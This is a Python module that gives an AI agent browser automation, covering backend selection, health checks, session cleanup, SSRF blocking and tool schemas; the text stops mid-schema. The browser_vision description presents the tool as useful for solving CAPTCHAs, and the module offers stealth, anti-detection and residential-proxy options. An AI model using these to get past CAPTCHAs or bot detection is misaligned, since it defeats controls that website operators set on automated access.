#!/usr/bin/env python3
"""
Browser Tool Module

This module provides browser automation tools using agent-browser CLI.  It
supports multiple backends — **Browser Use** (cloud), **Browserbase** (cloud,
direct credentials), and **local
Chromium** — with identical agent-facing behaviour.  The backend is
auto-detected from config and available credentials.

The tool uses agent-browser's accessibility tree (ariaSnapshot) for text-based
page representation, making it ideal for LLM agents without vision capabilities.

Features:
- **Local mode** (default): zero-cost headless Chromium via agent-browser.
  Works on Linux servers without a display.  One-time setup:
  ``agent-browser install`` (downloads Chromium) or
  ``agent-browser install --with-deps`` (also installs system libraries for
  Debian/Ubuntu/Docker).
- **Cloud mode**: Browserbase or Browser Use cloud execution when configured.
- Session isolation per task ID
- Text-based page snapshots using accessibility tree
- Element interaction via ref selectors (@e1, @e2, etc.)
- Task-aware content extraction using LLM summarization
- Automatic cleanup of browser sessions

Environment Variables:
- BROWSERBASE_API_KEY: API key for direct Browserbase cloud mode
- BROWSERBASE_PROJECT_ID: Project ID for direct Browserbase cloud mode
- BROWSER_USE_API_KEY: API key for direct Browser Use cloud mode
- BROWSERBASE_PROXIES: Enable/disable residential proxies (default: "true")
- BROWSERBASE_ADVANCED_STEALTH: Enable advanced stealth mode with custom Chromium,
  requires Scale Plan (default: "false")
- BROWSERBASE_KEEP_ALIVE: Enable keepAlive for session reconnection after disconnects,
  requires paid plan (default: "true")
- BROWSERBASE_SESSION_TIMEOUT: Custom session timeout in milliseconds. Set to extend
  beyond project default. Common values: 600000 (10min), 1800000 (30min) (default: none)

Usage:
    from tools.browser_tool import browser_navigate, browser_snapshot, browser_click

    # Navigate to a page
    result = browser_navigate("https://example.com", task_id="task_123")

    # Get page snapshot
    snapshot = browser_snapshot(task_id="task_123")

    # Click an element
    browser_click("@e5", task_id="task_123")
"""

import atexit
import functools
import json
import logging
import os
import re
import shutil
import signal
import subprocess
import sys
import tempfile
import threading
import time
from pathlib import Path
from typing import Any

import requests

from agent.auxiliary_client import call_llm
from core.spark_constants import get_spark_home
from core.spark_constants import is_termux as _is_termux_environment
from tools import browser_action_log, browser_permission_gate, browser_takeover
from tools.registry import registry, tool_error

try:
    from tools.website_policy import check_website_access
except Exception:
    check_website_access = lambda url: None  # noqa: E731 — fail-open if policy module unavailable

try:
    from tools.url_safety import is_safe_url as _is_safe_url
except Exception:
    _is_safe_url = lambda url: False  # noqa: E731 — fail-closed: block all if safety module unavailable
from tools.browser_providers.base import CloudBrowserProvider
from tools.browser_providers.browser_use import BrowserUseProvider
from tools.browser_providers.browserbase import BrowserbaseProvider
from tools.browser_providers.firecrawl import FirecrawlProvider
from tools.tool_backend_helpers import normalize_browser_cloud_provider

# Camofox local anti-detection browser backend (optional).
# When CAMOFOX_URL is set, all browser operations route through the
# camofox REST API instead of the agent-browser CLI.
try:
    from tools.browser_camofox import is_camofox_mode as _is_camofox_mode
except ImportError:
    _is_camofox_mode = lambda: False  # noqa: E731

logger = logging.getLogger(__name__)

# Standard PATH entries for environments with minimal PATH (e.g. systemd services).
# Includes macOS Homebrew paths (/opt/homebrew/* for Apple Silicon).
_SANE_PATH = (
    "/opt/homebrew/bin:/opt/homebrew/sbin:"
    "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
)


@functools.lru_cache(maxsize=1)
def _discover_homebrew_node_dirs() -> tuple[str, ...]:
    """Find Homebrew versioned Node.js bin directories (e.g. node@20, node@24).

    When Node is installed via ``brew install node@24`` and NOT linked into
    /opt/homebrew/bin, agent-browser isn't discoverable on the default PATH.
    This function finds those directories so they can be prepended.
    """
    dirs: list[str] = []
    homebrew_opt = "/opt/homebrew/opt"
    if not os.path.isdir(homebrew_opt):
        return tuple(dirs)
    try:
        for entry in os.listdir(homebrew_opt):
            if entry.startswith("node") and entry != "node":
                bin_dir = os.path.join(homebrew_opt, entry, "bin")
                if os.path.isdir(bin_dir):
                    dirs.append(bin_dir)
    except OSError:
        pass
    return tuple(dirs)

# Throttle screenshot cleanup to avoid repeated full directory scans.
_last_screenshot_cleanup_by_dir: dict[str, float] = {}

# ============================================================================
# Configuration
# ============================================================================

# Default timeout for browser commands (seconds).
#
# This is the wall-clock ceiling for a SINGLE agent-browser CLI invocation
# (open/snapshot/click/…).  It is NOT a page-load timeout — agent-browser has
# its own internal navigation waits.  ``browser_navigate`` deliberately raises
# the floor to ``max(command_timeout, 60)`` because a cold first navigation
# (daemon spin-up + Chromium launch + initial page load) routinely needs more
# than 30s, whereas follow-up commands on a warm daemon are fast.
#
# On a healthy machine 30s is plenty.  On a misconfigured headless VPS (missing
# Chromium system libs, no sandbox) every command would otherwise hang for the
# full timeout and the agent would burn its whole iteration budget retrying.
# The preflight health check (``_browser_backend_healthy``) and the circuit
# breaker (``_record_browser_timeout``) exist to fail fast in that case instead
# of waiting out repeated 30s/60s timeouts.  Tune via
# ``config["browser"]["command_timeout"]`` (floored at 5s).
DEFAULT_COMMAND_TIMEOUT = 30

# Max tokens for snapshot content before summarization
SNAPSHOT_SUMMARIZE_THRESHOLD = 8000

# Commands that legitimately return empty stdout (e.g. close, record).
_EMPTY_OK_COMMANDS: frozenset = frozenset({"close", "record"})

_cached_command_timeout: int | None = None
_command_timeout_resolved = False

# ============================================================================
# Backend health preflight + circuit breaker
# ============================================================================
#
# On a headless VPS where agent-browser/Chromium cannot launch (missing system
# libraries, no sandbox), every browser command hangs until the full timeout.
# A single agent turn can then exhaust its iteration budget just retrying
# timed-out navigations.  Two guards prevent that:
#
#   1. Preflight health check — before the first navigation we run a cheap
#      ``agent-browser --version`` probe with a short timeout.  If it fails we
#      return a fast, actionable error instead of attempting a navigation that
#      will hang.  Cached per process; reset by ``cleanup_all_browsers()``.
#
#   2. Circuit breaker — after N consecutive command timeouts within the
#      process we short-circuit further browser calls with a clear message so
#      the agent stops retrying.  The counter resets on any successful command
#      and on ``cleanup_all_browsers()``.

# Short timeout for the preflight probe — must be fast so an unhealthy backend
# fails quickly rather than waiting out the full command timeout.
_HEALTH_PROBE_TIMEOUT = 8

# Number of consecutive timeouts that trips the circuit breaker.
_TIMEOUT_BREAKER_THRESHOLD = 3

# Cached preflight result: None = not yet checked; (healthy, error_message).
_backend_health: tuple | None = None
_backend_health_lock = threading.Lock()

# Consecutive-timeout counter for the circuit breaker.
_consecutive_timeouts = 0
_breaker_tripped = False


def _headless_linux_hint() -> str:
    """Extra guidance for headless Linux servers (no $DISPLAY)."""
    if sys.platform.startswith("linux") and not os.environ.get("DISPLAY"):
        return (
            " On a headless Linux server you must install Chromium's system "
            "libraries: run `agent-browser install --with-deps` (Debian/Ubuntu) "
            "and ensure the process can launch Chromium without a sandbox."
        )
    return ""


def _backend_unhealthy_error(detail: str) -> str:
    """Build the fast, actionable error returned when the backend is unhealthy."""
    return (
        f"Browser backend is not available: {detail}. "
        f"Install/repair it with: {_browser_install_hint()}."
        f"{_headless_linux_hint()}"
    )


def _check_backend_health() -> tuple:
    """Probe that agent-browser can launch.

    Returns ``(healthy: bool, error: str)``.  Runs a cheap ``--version`` probe
    with a short timeout so an unhealthy backend fails fast instead of hanging.
    """
    # Camofox routes through a REST API, not the agent-browser CLI.
    if _is_camofox_mode():
        return (True, "")

    try:
        browser_cmd = _find_agent_browser()
    except FileNotFoundError as e:
        return (False, str(e))

    if _requires_real_termux_browser_install(browser_cmd):
        return (False, _termux_browser_install_error())

    cmd_prefix = ["npx", "agent-browser"] if browser_cmd == "npx agent-browser" else [browser_cmd]
    try:
        proc = subprocess.run(
            cmd_prefix + ["--version"],
            capture_output=True,
            text=True,
            timeout=_HEALTH_PROBE_TIMEOUT,
            stdin=subprocess.DEVNULL,
        )
    except subprocess.TimeoutExpired:
        return (False, f"agent-browser did not respond within {_HEALTH_PROBE_TIMEOUT}s (probe timed out)")
    except Exception as e:
        return (False, f"agent-browser could not be launched: {e}")

    if proc.returncode != 0:
        err = (proc.stderr or proc.stdout or "").strip()[:300] or f"exit code {proc.returncode}"
        return (False, f"agent-browser --version failed: {err}")

    return (True, "")


def _browser_backend_healthy() -> tuple:
    """Return cached ``(healthy, error)`` for the browser backend.

    The probe runs once per process; the result is cached until
    ``cleanup_all_browsers()`` resets it.  Cloud providers are assumed healthy
    here (their own ``create_session`` surfaces credential/connectivity errors).
    """
    global _backend_health
    # Cloud backends are validated by the provider, not the local CLI probe.
    if _get_cloud_provider() is not None and not _is_camofox_mode():
        return (True, "")
    with _backend_health_lock:
        if _backend_health is None:
            _backend_health = _check_backend_health()
        return _backend_health


def _breaker_is_open() -> bool:
    """True when the consecutive-timeout circuit breaker has tripped."""
    return _breaker_tripped


def _breaker_error() -> str:
    return (
        f"Browser circuit breaker open: {_TIMEOUT_BREAKER_THRESHOLD} consecutive "
        "browser commands timed out, so further browser calls are being "
        "short-circuited to avoid exhausting the iteration budget. The backend "
        "is likely unable to launch Chromium."
        f"{_headless_linux_hint()} "
        "Stop using the browser for this task, or fix the backend and retry."
    )


def _record_browser_timeout() -> None:
    """Increment the consecutive-timeout counter and trip the breaker at N."""
    global _consecutive_timeouts, _breaker_tripped
    with _backend_health_lock:
        _consecutive_timeouts += 1
        if _consecutive_timeouts >= _TIMEOUT_BREAKER_THRESHOLD:
            _breaker_tripped = True
            logger.warning(
                "Browser circuit breaker tripped after %d consecutive timeouts",
                _consecutive_timeouts,
            )


def _record_browser_success() -> None:
    """Reset the circuit breaker after a successful browser command."""
    global _consecutive_timeouts, _breaker_tripped
    if _consecutive_timeouts or _breaker_tripped:
        with _backend_health_lock:
            _consecutive_timeouts = 0
            _breaker_tripped = False


def _reset_backend_health_state() -> None:
    """Clear cached health + circuit-breaker state (cleanup / tests)."""
    global _backend_health, _consecutive_timeouts, _breaker_tripped
    with _backend_health_lock:
        _backend_health = None
        _consecutive_timeouts = 0
        _breaker_tripped = False


def _get_command_timeout() -> int:
    """Return the configured browser command timeout from config.yaml.

    Reads ``config["browser"]["command_timeout"]`` and falls back to
    ``DEFAULT_COMMAND_TIMEOUT`` (30s) if unset or unreadable.  Result is
    cached after the first call and cleared by ``cleanup_all_browsers()``.

    See ``DEFAULT_COMMAND_TIMEOUT`` for the meaning/semantics of this value.
    """
    global _cached_command_timeout, _command_timeout_resolved
    if _command_timeout_resolved:
        return _cached_command_timeout  # type: ignore[return-value]

    _command_timeout_resolved = True
    result = DEFAULT_COMMAND_TIMEOUT
    try:
        from spark_cli.config import read_raw_config
        cfg = read_raw_config()
        val = cfg.get("browser", {}).get("command_timeout")
        if val is not None:
            result = max(int(val), 5)  # Floor at 5s to avoid instant kills
    except Exception as e:
        logger.debug("Could not read command_timeout from config: %s", e)
    _cached_command_timeout = result
    return result


def _get_vision_model() -> str | None:
    """Model for browser_vision (screenshot analysis — multimodal)."""
    return os.getenv("AUXILIARY_VISION_MODEL", "").strip() or None


def _get_extraction_model() -> str | None:
    """Model for page snapshot text summarization — same as web_extract."""
    return os.getenv("AUXILIARY_WEB_EXTRACT_MODEL", "").strip() or None


def _resolve_cdp_override(cdp_url: str) -> str:
    """Normalize a user-supplied CDP endpoint into a concrete connectable URL.

    Accepts:
    - full websocket endpoints: ws://host:port/devtools/browser/...
    - HTTP discovery endpoints: http://host:port or http://host:port/json/version
    - bare websocket host:port values like ws://host:port

    For discovery-style endpoints we fetch /json/version and return the
    webSocketDebuggerUrl so downstream tools always receive a concrete browser
    websocket instead of an ambiguous host:port URL.
    """
    raw = (cdp_url or "").strip()
    if not raw:
        return ""

    lowered = raw.lower()
    if not _browser_private_network_allowed(raw):
        logger.warning("Blocked CDP endpoint targeting a private/internal address: %s", raw)
        return ""

    if "/devtools/browser/" in lowered:
        return raw

    discovery_url = raw
    if lowered.startswith(("ws://", "wss://")):
        if raw.count(":") == 2 and raw.rstrip("/").rsplit(":", 1)[-1].isdigit() and "/" not in raw.split(":", 2)[-1]:
            discovery_url = ("http://" if lowered.startswith("ws://") else "https://") + raw.split("://", 1)[1]
        else:
            return raw

    if discovery_url.lower().endswith("/json/version"):
        version_url = discovery_url
    else:
        version_url = discovery_url.rstrip("/") + "/json/version"

    try:
        response = requests.get(version_url, timeout=10)
        response.raise_for_status()
        payload = response.json()
    except Exception as exc:
        logger.warning("Failed to resolve CDP endpoint %s via %s: %s", raw, version_url, exc)
        return raw

    ws_url = str(payload.get("webSocketDebuggerUrl") or "").strip()
    if ws_url:
        if not _browser_private_network_allowed(ws_url):
            logger.warning("Blocked CDP discovery result targeting a private/internal address: %s", ws_url)
            return ""
        logger.info("Resolved CDP endpoint %s -> %s", raw, ws_url)
        return ws_url

    logger.warning("CDP discovery at %s did not return webSocketDebuggerUrl; using raw endpoint", version_url)
    return raw


def _get_cdp_override() -> str:
    """Return a normalized user-supplied CDP URL override, or empty string.

    When ``BROWSER_CDP_URL`` is set (e.g. via ``/browser connect``), we skip
    both Browserbase and the local headless launcher and connect directly to
    the supplied Chrome DevTools Protocol endpoint.
    """
    return _resolve_cdp_override(os.environ.get("BROWSER_CDP_URL", ""))


# ============================================================================
# Cloud Provider Registry
# ============================================================================

_PROVIDER_REGISTRY: dict[str, type] = {
    "browserbase": BrowserbaseProvider,
    "browser-use": BrowserUseProvider,
    "firecrawl": FirecrawlProvider,
}

_cached_cloud_provider: CloudBrowserProvider | None = None
_cloud_provider_resolved = False
_allow_private_urls_resolved = False
_cached_allow_private_urls: bool | None = None
_cached_agent_browser: str | None = None
_agent_browser_resolved = False


def _get_cloud_provider() -> CloudBrowserProvider | None:
    """Return the configured cloud browser provider, or None for local mode.

    Reads ``config["browser"]["cloud_provider"]`` once and caches the result
    for the process lifetime. An explicit ``local`` provider disables cloud
    fallback. If unset, fall back to Browserbase when direct or managed
    Browserbase credentials are available.
    """
    global _cached_cloud_provider, _cloud_provider_resolved
    if _cloud_provider_resolved:
        return _cached_cloud_provider

    _cloud_provider_resolved = True
    try:
        from spark_cli.config import read_raw_config
        cfg = read_raw_config()
        browser_cfg = cfg.get("browser", {})
        provider_key = None
        if isinstance(browser_cfg, dict) and "cloud_provider" in browser_cfg:
            provider_key = normalize_browser_cloud_provider(
                browser_cfg.get("cloud_provider")
            )
            if provider_key == "local":
                _cached_cloud_provider = None
                return None
        if provider_key and provider_key in _PROVIDER_REGISTRY:
            _cached_cloud_provider = _PROVIDER_REGISTRY[provider_key]()
    except Exception as e:
        logger.debug("Could not read cloud_provider from config: %s", e)

    if _cached_cloud_provider is None:
        # Prefer Browser Use when a direct API key is configured,
        # fall back to Browserbase (direct credentials only).
        fallback_provider = BrowserUseProvider()
        if fallback_provider.is_configured():
            _cached_cloud_provider = fallback_provider
        else:
            fallback_provider = BrowserbaseProvider()
            if fallback_provider.is_configured():
                _cached_cloud_provider = fallback_provider

    return _cached_cloud_provider


def _browser_install_hint() -> str:
    if _is_termux_environment():
        return "npm install -g agent-browser && agent-browser install"
    return "npm install -g agent-browser && agent-browser install --with-deps"


def _requires_real_termux_browser_install(browser_cmd: str) -> bool:
    return _is_termux_environment() and _is_local_mode() and browser_cmd.strip() == "npx agent-browser"


def _termux_browser_install_error() -> str:
    return (
        "Local browser automation on Termux cannot rely on the bare npx fallback. "
        f"Install agent-browser explicitly first: {_browser_install_hint()}"
    )


def _is_local_mode() -> bool:
    """Return True when the browser tool will use a local browser backend."""
    if _get_cdp_override():
        return False
    return _get_cloud_provider() is None


def _is_local_backend() -> bool:
    """Return True when the browser runs locally (no cloud provider).

    SSRF protection is only meaningful for cloud backends (Browserbase,
    BrowserUse) where the agent could reach internal resources on a remote
    machine.  For local backends — Camofox, or the built-in headless
    Chromium without a cloud provider — the user already has full terminal
    and network access on the same machine, so the check adds no security
    value.
    """
    return _is_camofox_mode() or _get_cloud_provider() is None


def _allow_private_urls() -> bool:
    """Return whether the browser is allowed to navigate to private/internal addresses.

    Reads ``config["browser"]["allow_private_urls"]`` once and caches the result
    for the process lifetime.  Defaults to ``False`` (SSRF protection active).
    """
    global _cached_allow_private_urls, _allow_private_urls_resolved
    if _allow_private_urls_resolved:
        return _cached_allow_private_urls

    _allow_private_urls_resolved = True
    _cached_allow_private_urls = False  # safe default
    try:
        from spark_cli.config import read_raw_config
        cfg = read_raw_config()
        _cached_allow_private_urls = bool(cfg.get("browser", {}).get("allow_private_urls"))
    except Exception as e:
        logger.debug("Could not read allow_private_urls from config: %s", e)
    return _cached_allow_private_urls


def _is_loopback_dev_url(url: str) -> bool:
    """Return True for explicit-port loopback URLs used by local previews/CDP."""
    try:
        from urllib.parse import urlparse

        parsed = urlparse(url)
        if parsed.scheme.lower() not in {"http", "https", "ws", "wss"}:
            return False
        if parsed.port is None:
            return False
        hostname = (parsed.hostname or "").strip().lower().rstrip(".")
        if hostname == "localhost":
            return True
        try:
            import ipaddress
            return ipaddress.ip_address(hostname).is_loopback
        except ValueError:
            return False
    except Exception as exc:
        logger.debug("Loopback dev URL check failed for %s: %s", url, exc)
        return False


def _browser_private_network_allowed(url: str) -> bool:
    """Return True when browser/CDP may connect to ``url``.

    Private/internal addresses are blocked by default for every browser backend.
    The one default exception is explicit-port loopback URLs, which are the
    normal Spark preview/dev-server workflow.  Users can opt into broader
    private-network access with ``browser.allow_private_urls``.
    """
    return _allow_private_urls() or _is_loopback_dev_url(url) or _is_safe_url(url)


def _socket_safe_tmpdir() -> str:
    """Return a short temp directory path suitable for Unix domain sockets.

    macOS sets ``TMPDIR`` to ``/var/folders/xx/.../T/`` (~51 chars).  When we
    append ``agent-browser-spark_…`` the resulting socket path exceeds the
    104-byte macOS limit for ``AF_UNIX`` addresses, causing agent-browser to
    fail with "Failed to create socket directory" or silent screenshot failures.

    Linux ``tempfile.gettempdir()`` already returns ``/tmp``, so this is a
    no-op there.  On macOS we bypass ``TMPDIR`` and use ``/tmp`` directly
    (symlink to ``/private/tmp``, sticky-bit protected, always available).
    """
    if sys.platform == "darwin":
        return "/tmp"
    return tempfile.gettempdir()


# Track active sessions per task
# Stores: session_name (always), bb_session_id + cdp_url (cloud mode only)
_active_sessions: dict[str, dict[str, str]] = {}  # task_id -> {session_name, ...}
_recording_sessions: set = set()  # task_ids with active recordings

# Flag to track if cleanup has been done
_cleanup_done = False

# =============================================================================
# Inactivity Timeout Configuration
# =============================================================================

# Session inactivity timeout (seconds) - cleanup if no activity for this long
# Default: 5 minutes. Needs headroom for LLM reasoning between browser commands,
# especially when subagents are doing multi-step browser tasks.
BROWSER_SESSION_INACTIVITY_TIMEOUT = int(os.environ.get("BROWSER_INACTIVITY_TIMEOUT", "300"))

# Track last activity time per session
_session_last_activity: dict[str, float] = {}

# Background cleanup thread state
_cleanup_thread = None
_cleanup_running = False
# Protects _session_last_activity AND _active_sessions for thread safety
# (subagents run concurrently via ThreadPoolExecutor)
_cleanup_lock = threading.Lock()


def _emergency_cleanup_all_sessions():
    """
    Emergency cleanup of all active browser sessions.
    Called on process exit or interrupt to prevent orphaned sessions.
    """
    global _cleanup_done
    if _cleanup_done:
        return
    _cleanup_done = True

    if not _active_sessions:
        return

    logger.info("Emergency cleanup: closing %s active session(s)...",
                len(_active_sessions))

    try:
        cleanup_all_browsers()
    except Exception as e:
        logger.error("Emergency cleanup error: %s", e)
    finally:
        with _cleanup_lock:
            _active_sessions.clear()
            _session_last_activity.clear()
            _recording_sessions.clear()


# Register cleanup via atexit only.  Previous versions installed SIGINT/SIGTERM
# handlers that called sys.exit(), but this conflicts with prompt_toolkit's
# async event loop — a SystemExit raised inside a key-binding callback
# corrupts the coroutine state and makes the process unkillable.  atexit
# handlers run on any normal exit (including sys.exit), so browser sessions
# are still cleaned up without hijacking signals.
atexit.register(_emergency_cleanup_all_sessions)


# =============================================================================
# Inactivity Cleanup Functions
# =============================================================================

def _cleanup_inactive_browser_sessions():
    """
    Clean up browser sessions that have been inactive for longer than the timeout.

    This function is called periodically by the background cleanup thread to
    automatically close sessions that haven't been used recently, preventing
    orphaned sessions (local or Browserbase) from accumulating.
    """
    current_time = time.time()
    sessions_to_cleanup = []

    with _cleanup_lock:
        for task_id, last_time in list(_session_last_activity.items()):
            if current_time - last_time > BROWSER_SESSION_INACTIVITY_TIMEOUT:
                sessions_to_cleanup.append(task_id)

    for task_id in sessions_to_cleanup:
        try:
            elapsed = int(current_time - _session_last_activity.get(task_id, current_time))
            logger.info("Cleaning up inactive session for task: %s (inactive for %ss)", task_id, elapsed)
            cleanup_browser(task_id)
            with _cleanup_lock:
                if task_id in _session_last_activity:
                    del _session_last_activity[task_id]
        except Exception as e:
            logger.warning("Error cleaning up inactive session %s: %s", task_id, e)


def _reap_orphaned_browser_sessions():
    """Scan for orphaned agent-browser daemon processes from previous runs.

    When the Python process that created a browser session exits uncleanly
    (SIGKILL, crash, gateway restart), the in-memory ``_active_sessions``
    tracking is lost but the node + Chromium processes keep running.

    This function scans the tmp directory for ``agent-browser-*`` socket dirs
    left behind by previous runs, reads the daemon PID files, and kills any
    daemons that are still alive but not tracked by the current process.

    Called once on cleanup-thread startup — not every 30 seconds — to avoid
    races with sessions being actively created.
    """
    import glob

    tmpdir = _socket_safe_tmpdir()
    pattern = os.path.join(tmpdir, "agent-browser-h_*")
    socket_dirs = glob.glob(pattern)
    # Also pick up CDP sessions
    socket_dirs += glob.glob(os.path.join(tmpdir, "agent-browser-cdp_*"))

    if not socket_dirs:
        return

    # Build set of session_names currently tracked by this process
    with _cleanup_lock:
        tracked_names = {
            info.get("session_name")
            for info in _active_sessions.values()
            if info.get("session_name")
        }

    reaped = 0
    for socket_dir in socket_dirs:
        dir_name = os.path.basename(socket_dir)
        # dir_name is "agent-browser-{session_name}"
        session_name = dir_name.removeprefix("agent-browser-")
        if not session_name:
            continue

        # Skip sessions that we are actively tracking
        if session_name in tracked_names:
            continue

        pid_file = os.path.join(socket_dir, f"{session_name}.pid")
        if not os.path.isfile(pid_file):
            # No PID file — just a stale dir, remove it
            shutil.rmtree(socket_dir, ignore_errors=True)
            continue

        try:
            daemon_pid = int(Path(pid_file).read_text().strip())
        except (ValueError, OSError):
            shutil.rmtree(socket_dir, ignore_errors=True)
            continue

        # Check if the daemon is still alive
        try:
            os.kill(daemon_pid, 0)  # signal 0 = existence check
        except ProcessLookupError:
            # Already dead, just clean up the dir
            shutil.rmtree(socket_dir, ignore_errors=True)
            continue
        except PermissionError:
            # Alive but owned by someone else — leave it alone
            continue

        # Daemon is alive and not tracked — orphan. Kill it.
        try:
            os.kill(daemon_pid, signal.SIGTERM)
            logger.info("Reaped orphaned browser daemon PID %d (session %s)",
                        daemon_pid, session_name)
            reaped += 1
        except (ProcessLookupError, PermissionError, OSError):
            pass

        # Clean up the socket directory
        shutil.rmtree(socket_dir, ignore_errors=True)

    if reaped:
        logger.info("Reaped %d orphaned browser session(s) from previous run(s)", reaped)


def _browser_cleanup_thread_worker():
    """
    Background thread that periodically cleans up inactive browser sessions.

    Runs every 30 seconds and checks for sessions that haven't been used
    within the BROWSER_SESSION_INACTIVITY_TIMEOUT period.
    On first run, also reaps orphaned sessions from previous process lifetimes.
    """
    # One-time orphan reap on startup
    try:
        _reap_orphaned_browser_sessions()
    except Exception as e:
        logger.warning("Orphan reap error: %s", e)

    while _cleanup_running:
        try:
            _cleanup_inactive_browser_sessions()
        except Exception as e:
            logger.warning("Cleanup thread error: %s", e)

        # Sleep in 1-second intervals so we can stop quickly if needed
        for _ in range(30):
            if not _cleanup_running:
                break
            time.sleep(1)


def _start_browser_cleanup_thread():
    """Start the background cleanup thread if not already running."""
    global _cleanup_thread, _cleanup_running

    with _cleanup_lock:
        if _cleanup_thread is None or not _cleanup_thread.is_alive():
            _cleanup_running = True
            _cleanup_thread = threading.Thread(
                target=_browser_cleanup_thread_worker,
                daemon=True,
                name="browser-cleanup"
            )
            _cleanup_thread.start()
            logger.info("Started inactivity cleanup thread (timeout: %ss)", BROWSER_SESSION_INACTIVITY_TIMEOUT)


def _stop_browser_cleanup_thread():
    """Stop the background cleanup thread."""
    global _cleanup_running
    _cleanup_running = False
    if _cleanup_thread is not None:
        _cleanup_thread.join(timeout=5)


def _update_session_activity(task_id: str):
    """Update the last activity timestamp for a session."""
    with _cleanup_lock:
        _session_last_activity[task_id] = time.time()


# Register cleanup thread stop on exit
atexit.register(_stop_browser_cleanup_thread)


# ============================================================================
# Tool Schemas
# ============================================================================

BROWSER_TOOL_SCHEMAS = [
    {
        "name": "browser_open",
        "description": "Open a URL in the browser. This is the entry point for browser automation — call it first to navigate to a page and unlock the rest of the browser toolset (browser_snapshot, browser_click, browser_type, browser_scroll, browser_back, browser_press, browser_get_images, browser_vision, browser_console) for the remainder of this session. Returns a compact page snapshot with interactive ref IDs. For simple information retrieval, prefer web_search or web_extract (faster, cheaper) — only use the browser when you need to interact with a page.",
        "parameters": {
            "type": "object",
            "properties": {
                "url": {
                    "type": "string",
                    "description": "The URL to navigate to (e.g., 'https://example.com')"
                }
            },
            "required": ["url"]
        }
    },
    {
        "name": "browser_navigate",
        "description": "Navigate to a URL in the browser. Initializes the session and loads the page. Must be called before other browser tools. For simple information retrieval, prefer web_search or web_extract (faster, cheaper). Use browser tools when you need to interact with a page (click, fill forms, dynamic content). Returns a compact page snapshot with interactive elements and ref IDs — no need to call browser_snapshot separately after navigating.",
        "parameters": {
            "type": "object",
            "properties": {
                "url": {
                    "type": "string",
                    "description": "The URL to navigate to (e.g., 'https://example.com')"
                }
            },
            "required": ["url"]
        }
    },
    {
        "name": "browser_snapshot",
        "description": "Get a text-based snapshot of the current page's accessibility tree. Returns interactive elements with ref IDs (like @e1, @e2) for browser_click and browser_type. full=false (default): compact view with interactive elements. full=true: complete page content. Snapshots over 8000 chars are truncated or LLM-summarized. Requires browser_navigate first. Note: browser_navigate already returns a compact snapshot — use this to refresh after interactions that change the page, or with full=true for complete content.",
        "parameters": {
            "type": "object",
            "properties": {
                "full": {
                    "type": "boolean",
                    "description": "If true, returns complete page content. If false (default), returns compact view with interactive elements only.",
                    "default": False
                }
            },
            "required": []
        }
    },
    {
        "name": "browser_a11y",
        "description": "Get the page's accessibility tree as structured element references — far cheaper in tokens than a screenshot and more reliable for clicking. Returns a list of interactive/semantic elements, each with its ref ID (e.g. '@e5'), role, name/label, and value. The returned refs are directly usable by browser_click and browser_type. Operates on the same shared session as the rest of the browser toolset. Use this instead of browser_vision when you only need to understand and interact with page structure (forms, buttons, links) rather than its visual appearance. Requires browser_navigate first.",
        "parameters": {
            "type": "object",
            "properties": {
                "interactive_only": {
                    "type": "boolean",
                    "default": True,
                    "description": "If true (default), return only interactive/actionable elements (buttons, links, inputs). If false, include the full structured tree."
                }
            },
            "required": []
        }
    },
    {
        "name": "browser_click",
        "description": "Click on an element identified by its ref ID from the snapshot (e.g., '@e5'). The ref IDs are shown in square brackets in the snapshot output. Requires browser_navigate and browser_snapshot to be called first.",
        "parameters": {
            "type": "object",
            "properties": {
                "ref": {
                    "type": "string",
                    "description": "The element reference from the snapshot (e.g., '@e5', '@e12')"
                },
                "confirm": {
                    "type": "boolean",
                    "default": False,
                    "description": "Set true ONLY after the user has explicitly approved a sensitive action (payment, sending a message, logging into a new domain) that this tool previously flagged with needs_confirmation. Do not set this preemptively."
                }
            },
            "required": ["ref"]
        }
    },
    {
        "name": "browser_type",
        "description": "Type text into an input field identified by its ref ID. Clears the field first, then types the new text. Requires browser_navigate and browser_snapshot to be called first.",
        "parameters": {
            "type": "object",
            "properties": {
                "ref": {
                    "type": "string",
                    "description": "The element reference from the snapshot (e.g., '@e3')"
                },
                "text": {
                    "type": "string",
                    "description": "The text to type into the field"
                },
                "confirm": {
                    "type": "boolean",
                    "default": False,
                    "description": "Set true ONLY after the user has explicitly approved a sensitive action that this tool previously flagged with needs_confirmation."
                }
            },
            "required": ["ref", "text"]
        }
    },
    {
        "name": "browser_scroll",
        "description": "Scroll the page in a direction. Use this to reveal more content that may be below or above the current viewport. Requires browser_navigate to be called first.",
        "parameters": {
            "type": "object",
            "properties": {
                "direction": {
                    "type": "string",
                    "enum": ["up", "down"],
                    "description": "Direction to scroll"
                }
            },
            "required": ["direction"]
        }
    },
    {
        "name": "browser_back",
        "description": "Navigate back to the previous page in browser history. Requires browser_navigate to be called first.",
        "parameters": {
            "type": "object",
            "properties": {},
            "required": []
        }
    },
    {
        "name": "browser_press",
        "description": "Press a keyboard key. Useful for submitting forms (Enter), navigating (Tab), or keyboard shortcuts. Requires browser_navigate to be called first.",
        "parameters": {
            "type": "object",
            "properties": {
                "key": {
                    "type": "string",
                    "description": "Key to press (e.g., 'Enter', 'Tab', 'Escape', 'ArrowDown')"
                }
            },
            "required": ["key"]
        }
    },
    {
        "name": "browser_get_images",
        "description": "Get a list of all images on the current page with their URLs and alt text. Useful for finding images to analyze with the vision tool. Requires browser_navigate to be called first.",
        "parameters": {
            "type": "object",
            "properties": {},
            "required": []
        }
    },
    {
        "name": "browser_vision",
        "description": "Take a screenshot of the current page and analyze it with vision AI. Use this when you need to visually understand what's on the page - especially useful for CAPTCHAs, visual verification challenges, complex layouts, or when the text snapshot doesn't capture important visual information. Returns both the AI analysis and a screenshot_path that you can share with the user by including MEDIA:<screenshot_path> in your response. Requires browser_navigate to be called first.",
        "parameters": {
            "type": "object",
            "properties": {
                "question": {
                    "type": "string",
                    "description": "What you want to know about the page visually. Be specific about what you're looking for."
                },
                "annotate": {
                    "type": "boolean",
                    "default": False,
                    "description": "If true, overlay numbered [N] labels on interactive elements. Each [N] maps to ref @eN for subsequent browser commands. Useful for QA and spatial reasoning about page layout."
                }
            },
            "required": ["question"]
        }
    },
    {
        "name": "browser_console",
        "description": "Get browser console output and JavaScript errors from the current page. Returns console.log/warn/error/info messages and uncaught JS exceptions. Use this to detect silent JavaScript errors, failed API calls, and application warnings. Requires browser_navigate to be called first. When 'expression' is provided, evaluates JavaScript in the page context and returns the result — use this for DOM inspection, reading page state, or extracting data programmatically.",
        "parameters": {
            "type": "object",
            "properties": {
                "clear": {
